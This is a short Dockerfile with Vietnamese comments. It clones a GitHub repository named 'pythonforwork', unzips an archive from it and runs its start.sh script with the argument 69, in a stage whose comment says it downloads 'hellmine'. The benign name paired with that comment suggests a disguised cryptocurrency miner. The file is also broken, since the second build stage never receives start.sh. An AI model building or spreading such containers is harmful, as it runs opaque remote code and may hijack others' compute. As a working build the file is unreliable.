FROM ubuntu:latest


# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt install htop curl unzip python3 git -y && git clone https://github.com/Teo4268/pythonforwork.git && cd pythonforwork && unzip pythonforwork.zip && cd pythonforwork && chmod +x ./start.sh
    
FROM quay.io/jupyterhub/k8s-network-tools:4.0.0
# Tạo thư mục làm việc và tải hellmine

RUN start.sh 69
